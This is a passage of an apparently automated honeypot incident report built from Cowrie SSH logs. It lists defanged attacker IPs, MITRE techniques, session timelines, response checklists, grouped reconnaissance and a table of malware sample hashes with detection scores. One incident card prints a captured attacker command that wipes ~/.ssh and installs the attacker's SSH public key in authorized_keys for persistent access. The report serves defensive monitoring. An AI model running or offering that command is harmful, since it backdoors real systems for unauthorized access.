| **Last Seen** | 2026-08-01 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:45:34` | `cowrie.session.connect` |
| `2026-08-01 19:45:34` | `cowrie.client.version` |
| `2026-08-01 19:45:34` | `cowrie.client.kex` |
| `2026-08-01 19:45:35` | `cowrie.login.success` |
| `2026-08-01 19:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]157` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddd38e82f947

| Field | Detail |
|---|---|
| **Source IP** | `20.227.140[.]178` |
| **First Seen** | 2026-08-01 20:10 |
| **Last Seen** | 2026-08-01 20:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 20:10:17` | `cowrie.session.connect` |
| `2026-08-01 20:10:17` | `cowrie.client.version` |
| `2026-08-01 20:10:17` | `cowrie.client.kex` |
| `2026-08-01 20:10:18` | `cowrie.login.success` |
| `2026-08-01 20:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.227.140[.]178` to AbuseIPDB if not already reported
- [ ] Block `20.227.140[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0132d962aee6

| Field | Detail |
|---|---|
| **Source IP** | `23.91.97[.]170` |
| **First Seen** | 2026-08-01 20:14 |
| **Last Seen** | 2026-08-01 20:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 20:14:11` | `cowrie.session.connect` |
| `2026-08-01 20:14:11` | `cowrie.client.version` |
| `2026-08-01 20:14:11` | `cowrie.client.kex` |
| `2026-08-01 20:14:12` | `cowrie.login.success` |
| `2026-08-01 20:14:13` | `cowrie.session.params` |
| `2026-08-01 20:14:13` | `cowrie.command.input` |
| `2026-08-01 20:14:13` | `cowrie.command.failed` |
| `2026-08-01 20:14:14` | `cowrie.log.closed` |
| `2026-08-01 20:14:14` | `cowrie.session.params` |
| `2026-08-01 20:14:14` | `cowrie.command.input` |
| `2026-08-01 20:14:15` | `cowrie.session.file_download` |
| `2026-08-01 20:14:15` | `cowrie.log.closed` |
| `2026-08-01 20:14:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.91.97[.]170` to AbuseIPDB if not already reported
- [ ] Block `23.91.97[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-840120be3caa

| Field | Detail |
|---|---|
| **Source IP** | `23.91.97[.]170` |
| **First Seen** | 2026-08-01 20:14 |
| **Last Seen** | 2026-08-01 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 20:14:15` | `cowrie.session.connect` |
| `2026-08-01 20:14:15` | `cowrie.client.version` |
| `2026-08-01 20:14:15` | `cowrie.client.kex` |
| `2026-08-01 20:14:16` | `cowrie.login.success` |
| `2026-08-01 20:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.91.97[.]170` to AbuseIPDB if not already reported
- [ ] Block `23.91.97[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c142386ecd

| Field | Detail |
|---|---|
| **Source IP** | `23.91.97[.]170` |
| **First Seen** | 2026-08-01 20:14 |
| **Last Seen** | 2026-08-01 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 20:14:16` | `cowrie.session.connect` |
| `2026-08-01 20:14:16` | `cowrie.client.version` |
| `2026-08-01 20:14:17` | `cowrie.client.kex` |
| `2026-08-01 20:14:18` | `cowrie.login.success` |
| `2026-08-01 20:14:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.91.97[.]170` to AbuseIPDB if not already reported
- [ ] Block `23.91.97[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c0070af43f6

| Field | Detail |
|---|---|
| **Source IP** | `188.43.204[.]45` |
| **First Seen** | 2026-08-01 20:15 |
| **Last Seen** | 2026-08-01 20:20 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 20:15:33` | `cowrie.session.connect` |
| `2026-08-01 20:15:33` | `cowrie.client.version` |
| `2026-08-01 20:15:33` | `cowrie.client.kex` |
| `2026-08-01 20:15:35` | `cowrie.login.success` |
| `2026-08-01 20:15:35` | `cowrie.direct-tcpip.request` |
| `2026-08-01 20:20:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.43.204[.]45` to AbuseIPDB if not already reported
- [ ] Block `188.43.204[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12f5ac61a0cb

| Field | Detail |
|---|---|
| **Source IP** | `218.4.156[.]254` |
| **First Seen** | 2026-08-01 20:15 |
| **Last Seen** | 2026-08-01 20:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 20:15:40` | `cowrie.session.connect` |
| `2026-08-01 20:15:40` | `cowrie.client.version` |
| `2026-08-01 20:15:40` | `cowrie.client.kex` |
| `2026-08-01 20:15:42` | `cowrie.login.success` |
| `2026-08-01 20:15:43` | `cowrie.direct-tcpip.request` |
| `2026-08-01 20:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.4.156[.]254` to AbuseIPDB if not already reported
- [ ] Block `218.4.156[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bac21b9d3f7f

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]146` |
| **First Seen** | 2026-08-01 20:15 |
| **Last Seen** | 2026-08-01 20:20 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 20:15:49` | `cowrie.session.connect` |
| `2026-08-01 20:15:49` | `cowrie.client.version` |
| `2026-08-01 20:15:49` | `cowrie.client.kex` |
| `2026-08-01 20:15:50` | `cowrie.login.success` |
| `2026-08-01 20:15:51` | `cowrie.direct-tcpip.request` |
| `2026-08-01 20:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]146` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6654ccf001c2

| Field | Detail |
|---|---|
| **Source IP** | `31.173.8[.]170` |
| **First Seen** | 2026-08-01 20:16 |
| **Last Seen** | 2026-08-01 20:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 20:16:01` | `cowrie.session.connect` |
| `2026-08-01 20:16:02` | `cowrie.client.version` |
| `2026-08-01 20:16:02` | `cowrie.client.kex` |
| `2026-08-01 20:16:03` | `cowrie.login.success` |
| `2026-08-01 20:16:03` | `cowrie.direct-tcpip.request` |
| `2026-08-01 20:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.8[.]170` to AbuseIPDB if not already reported
- [ ] Block `31.173.8[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e483f2c29d7

| Field | Detail |
|---|---|
| **Source IP** | `103.171.39[.]147` |
| **First Seen** | 2026-08-01 20:24 |
| **Last Seen** | 2026-08-01 20:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 20:24:57` | `cowrie.session.connect` |
| `2026-08-01 20:24:58` | `cowrie.client.version` |
| `2026-08-01 20:24:58` | `cowrie.client.kex` |
| `2026-08-01 20:25:00` | `cowrie.login.success` |
| `2026-08-01 20:25:01` | `cowrie.direct-tcpip.request` |
| `2026-08-01 20:25:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.39[.]147` to AbuseIPDB if not already reported
- [ ] Block `103.171.39[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10002ffe03a3

| Field | Detail |
|---|---|
| **Source IP** | `31.77.227[.]120` |
| **First Seen** | 2026-08-01 20:28 |
| **Last Seen** | 2026-08-01 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 20:28:39` | `cowrie.session.connect` |
| `2026-08-01 20:28:39` | `cowrie.client.version` |
| `2026-08-01 20:28:39` | `cowrie.client.kex` |
| `2026-08-01 20:28:39` | `cowrie.login.success` |
| `2026-08-01 20:28:40` | `cowrie.session.params` |
| `2026-08-01 20:28:40` | `cowrie.command.input` |
| `2026-08-01 20:28:40` | `cowrie.log.closed` |
| `2026-08-01 20:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.77.227[.]120` to AbuseIPDB if not already reported
- [ ] Block `31.77.227[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba4e6ffc5d39

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-01 20:37 |
| **Last Seen** | 2026-08-01 20:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 20:37:11` | `cowrie.session.connect` |
| `2026-08-01 20:37:11` | `cowrie.client.version` |
| `2026-08-01 20:37:11` | `cowrie.client.kex` |
| `2026-08-01 20:37:12` | `cowrie.login.success` |
| `2026-08-01 20:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9dc026b589c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-01 20:37 |
| **Last Seen** | 2026-08-01 20:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 20:37:11` | `cowrie.session.connect` |
| `2026-08-01 20:37:11` | `cowrie.client.version` |
| `2026-08-01 20:37:12` | `cowrie.client.kex` |
| `2026-08-01 20:37:12` | `cowrie.login.success` |
| `2026-08-01 20:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df15cd6db41

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-01 20:46 |
| **Last Seen** | 2026-08-01 20:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 20:46:16` | `cowrie.session.connect` |
| `2026-08-01 20:46:16` | `cowrie.client.version` |
| `2026-08-01 20:46:16` | `cowrie.client.kex` |
| `2026-08-01 20:46:16` | `cowrie.login.success` |
| `2026-08-01 20:46:16` | `cowrie.direct-tcpip.request` |
| `2026-08-01 20:46:17` | `cowrie.direct-tcpip.data` |
| `2026-08-01 20:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **4** | 2026-08-01 19:43 | 2026-08-01 19:58 | 5m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]123` | **3** | 2026-08-01 19:48 | 2026-08-01 19:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-08-01 20:01 | 2026-08-01 20:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]205` | **3** | 2026-08-01 20:19 | 2026-08-01 20:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-08-01 19:46 | 2026-08-01 20:32 | 1m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-08-01 19:12 | 2026-08-01 20:13 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-08-01 19:33 | 2026-08-01 19:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | **2** | 2026-08-01 19:55 | 2026-08-01 19:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.89.60[.]76` | 1 | 2026-08-01 20:50 | 2026-08-01 20:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.121.204[.]181` | 1 | 2026-08-01 19:25 | 2026-08-01 19:25 | 13s | 0 | `T1592` | 🟢 LOW |
| `115.214.206[.]105` | 1 | 2026-08-01 19:33 | 2026-08-01 19:33 | 12s | 0 | `T1592` | 🟢 LOW |
| `163.192.48[.]255` | 1 | 2026-08-01 20:35 | 2026-08-01 20:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `177.22.44[.]30` | 1 | 2026-08-01 18:55 | 2026-08-01 18:55 | 30s | 0 | `T1592` | 🟢 LOW |
| `189.56.0[.]19` | 1 | 2026-08-01 19:07 | 2026-08-01 19:07 | 1s | 0 | `T1592` | 🟢 LOW |
| `192.161.49[.]2` | 1 | 2026-08-01 19:15 | 2026-08-01 19:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-08-01 20:38 | 2026-08-01 20:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `2.55.70[.]124` | 1 | 2026-08-01 20:23 | 2026-08-01 20:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `217.155.63[.]201` | 1 | 2026-08-01 20:13 | 2026-08-01 20:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `31.77.227[.]120` | 1 | 2026-08-01 20:28 | 2026-08-01 20:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-08-01 19:09 | 2026-08-01 19:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.56.79[.]53` | 1 | 2026-08-01 19:48 | 2026-08-01 19:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-08-01 20:38 | 2026-08-01 20:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]2` | 1 | 2026-08-01 19:06 | 2026-08-01 19:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]23` | 1 | 2026-08-01 20:50 | 2026-08-01 20:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | 1 | 2026-08-01 20:05 | 2026-08-01 20:05 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 40/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **25/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
